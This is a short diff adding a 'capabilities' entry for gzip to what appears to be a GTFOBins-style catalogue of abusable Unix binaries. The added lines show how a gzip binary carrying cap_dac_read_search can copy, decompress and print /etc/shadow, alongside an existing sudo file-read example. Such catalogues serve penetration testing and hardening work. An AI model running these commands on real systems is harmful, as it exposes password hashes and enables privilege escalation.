@@ -16,4 +16,11 @@ functions:
     - code: |
         LFILE=file_to_read
         sudo gzip -f $LFILE -t
+  capabilities:
+    - description: If cap_dac_read_search is set. Run ``getcap -r / 2>/dev/null`` to confirm ``/usr/bin/gzip cap_dac_read_search=ep``
+      code: |
+        gzip can read any file:
+        gzip -c /etc/shadow > /tmp/shadow.gz
+        gzip -d /tmp/shadow.gz
+        cat /tmp/shadow
 ---
